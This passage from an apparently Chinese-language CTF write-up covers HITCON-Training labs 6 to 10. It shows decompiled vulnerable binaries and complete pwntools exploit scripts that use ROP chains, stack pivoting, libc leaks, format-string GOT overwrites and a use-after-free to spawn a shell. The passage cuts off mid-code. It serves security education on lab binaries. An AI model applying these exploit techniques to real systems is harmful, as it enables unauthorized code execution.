class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">rop = <span class="string">'a'</span> * <span class="number">32</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/bin'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/sh\x00'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e850</span>) <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0xb</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080493e1</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="keyword">print</span> len(rop) <span class="comment">#100</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab6/migration&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count != <span class="number">1337</span> )  <span class="comment">//初始值为1337</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  ++count; </span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Try your best :"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题有两个限制：</p><ol><li>main只能使用一次</li><li>溢出长度只有20字节可以使用</li></ol><p>需要使用栈迁移stack privot（或者叫stack migrate），</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./migration"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">buf = <span class="number">0x0804a000</span> + <span class="number">0x200</span></span><br><span class="line">pr = <span class="number">0x0804836d</span></span><br><span class="line">pppr = <span class="number">0x08048569</span></span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#d(['0x08048502'])</span></span><br><span class="line"><span class="comment"># step1: write rop1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + flat(buf,elf.plt[<span class="string">'read'</span>],leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">':\n'</span>,payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment"># step2: leak libc.address &amp; write rop2</span></span><br><span class="line">payload = flat(buf+<span class="number">0x200</span>,elf.plt[<span class="string">'puts'</span>],pr,elf.got[<span class="string">'puts'</span>],elf.plt[<span class="string">'read'</span>],leave_ret,<span class="number">0</span>,buf+<span class="number">0x200</span>,<span class="number">0x100</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># step3: getshell</span></span><br><span class="line">payload = flat(<span class="number">0xdeadbeef</span>,libc.sym[<span class="string">'system'</span>],<span class="number">0xdeadbeef</span>,next(libc.search(<span class="string">'/bin/sh\x00'</span>)))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab7/crack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;password, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What your name ? "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello ,"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == password )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congrt!!"</span>);</span><br><span class="line">    system(<span class="string">"cat /home/crack/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Goodbyte"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最简单的格式化字符串漏洞，本题方法有三个：</p><ol><li><p>泄露<code>password</code>的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, p32(password_addr) + <span class="string">"#"</span> + <span class="string">"%10$s"</span> + <span class="string">"#"</span> )</span><br><span class="line">p.recvuntil(<span class="string">"#"</span>)</span><br><span class="line">password = u32(p.recvuntil(<span class="string">"#"</span>, drop=<span class="keyword">True</span>))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(password))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>修改<code>password</code>的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, fmtstr_payload(<span class="number">10</span>, &#123;password_addr: <span class="number">7</span>&#125;))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(<span class="number">7</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>修改<code>put@got</code>为<code>system(&quot;cat /home/crack/flag&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">puts_got = <span class="number">0x804A01C</span></span><br><span class="line">cat_flag = <span class="number">0x804872B</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, fmtstr_payload(<span class="number">10</span>, &#123;puts_got: cat_flag&#125;))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, <span class="string">"show me the flag!"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab8/craxme&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please crax me !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me magic :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">0xDA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">"cat /home/craxme/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( magic == <span class="number">0xFACEB00C</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">"cat /home/craxme/craxflag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need be a phd"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是格式化字符串漏洞，覆盖magic的方法不详述了，可以通过修改<code>puts@got</code>为<code>read(0, &amp;buf, 0x100u)</code>，修改<code>printf@got</code>为<code>system@plt</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./craxme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./craxme'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">'puts'</span>]:<span class="number">0x080485A1</span>,elf.got[<span class="string">'printf'</span>]:elf.plt[<span class="string">'system'</span>]&#125;))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab9/playfmt&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串存在bss段，不能直接利用，需要在stack上找一对指向stack的地址以及一对指向elf.code段的（有data段更好）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp  0xffffd480 —▸ 0x804a060 (buf) ◂— &apos;123\n&apos;</span><br><span class="line">01:0004│      0xffffd484 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd488 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd48c —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd490 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd494 —▸ 0xf7fb8000 ◂— 0x1b1db0</span><br><span class="line">06:0018│ ebp  0xffffd498 —▸ 0xffffd4a8 —▸ 0xffffd4b8 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd49c —▸ 0x8048584 (play+59) ◂— nop   step3:最后指向printf@got</span><br><span class="line">08:0020│      0xffffd4a0 —▸ 0xf7fb8d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd4a4 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd4a8 —▸ 0xffffd4b8 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffd4ac —▸ 0x80485b1 (main+42) ◂— nop   step3:最后指向printf@got+2</span><br><span class="line">0c:0030│      0xffffd4b0 —▸ 0xf7fb83dc —▸ 0xf7fb91e0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">12:0048│      0xffffd4c8 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd4cc —▸ 0xf7e1e637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">14:0050│      0xffffd4d0 ◂— 0x1</span><br><span class="line">15:0054│      0xffffd4d4 —▸ 0xffffd564 —▸ 0xffffd6c3 ◂— 0x6d6f682f (&apos;/hom&apos;)  step1:这个用来做跳板1</span><br><span class="line">16:0058│      0xffffd4d8 —▸ 0xffffd56c —▸ 0xffffd6ef ◂— &apos;USER=kira&apos;          step1:这个用来做跳板2</span><br><span class="line">17:005c│      0xffffd4dc ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">37:00dc│      0xffffd55c —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">38:00e0│      0xffffd560 ◂— 0x1</span><br><span class="line">39:00e4│      0xffffd564 —▸ 0xffffd6c3 ◂— 0x6d6f682f (&apos;/hom&apos;)  step2:指向最后指向printf@got的地址</span><br><span class="line">3a:00e8│      0xffffd568 ◂— 0x0</span><br><span class="line">3b:00ec│      0xffffd56c —▸ 0xffffd6ef ◂— &apos;USER=kira&apos;          step2:指向最后指向printf@got+2的地址</span><br><span class="line">3c:00f0│      0xffffd570 —▸ 0xffffd6f9 ◂— &apos;LOGNAME=kira&apos;</span><br></pre></td></tr></table></figure></p><p>观察stack情况，挑选标记那4个地址使用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hhn</span><span class="params">(addr,offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%&#123;addr&#125;c%&#123;offset&#125;$hhn"</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hn</span><span class="params">(addr,offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%&#123;addr&#125;c%&#123;offset&#125;$hn"</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#gogogo</span></span><br><span class="line">p.send(<span class="string">'start'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'start'</span>)</span><br><span class="line"><span class="comment">#step1</span></span><br><span class="line">p.sendline(<span class="string">'%6$p..%15$p..step1\x00'</span>)</span><br><span class="line">esp_addr = int(p.recvuntil(<span class="string">'..'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>) - <span class="number">0x28</span></span><br><span class="line">success(<span class="string">'esp_addr:&#123;:#x&#125;'</span>.format(esp_addr))</span><br><span class="line">libc_start_main_247 = int(p.recvuntil(<span class="string">'..'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = libc_start_main_247 - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">247</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment">#step2</span></span><br><span class="line">payload = hn((esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>,<span class="number">0x15</span>)</span><br><span class="line">payload += hn(((esp_addr+<span class="number">0x2c</span>)&amp;<span class="number">0xffff</span>-(esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>)%<span class="number">0xffff</span>,<span class="number">0x16</span>)</span><br><span class="line">payload += <span class="string">'step2\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step1'</span>,payload)</span><br><span class="line"><span class="comment">#step3</span></span><br><span class="line">payload = hn((elf.got[<span class="string">'printf'</span>])&amp;<span class="number">0xffff</span>,<span class="number">0x39</span>)</span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">0x3b</span>)</span><br><span class="line">payload += <span class="string">'step3\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step2'</span>,payload)</span><br><span class="line"><span class="comment">#step4</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload = hhn(libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>,<span class="number">0xb</span>)</span><br><span class="line">payload += hn((libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffff</span>) - (libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">0x7</span>)</span><br><span class="line">payload += <span class="string">'step4\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step3'</span>,payload)</span><br><span class="line"><span class="comment">#step5</span></span><br><span class="line">p.sendlineafter(<span class="string">'step4'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*printnote)();</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>UAF利用，add两个大小32的note，然后free掉，根据FILO的原则，重新add一个8大小的note，content部分会用到第0个note的结构体空间，将print_note覆盖成magic即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span 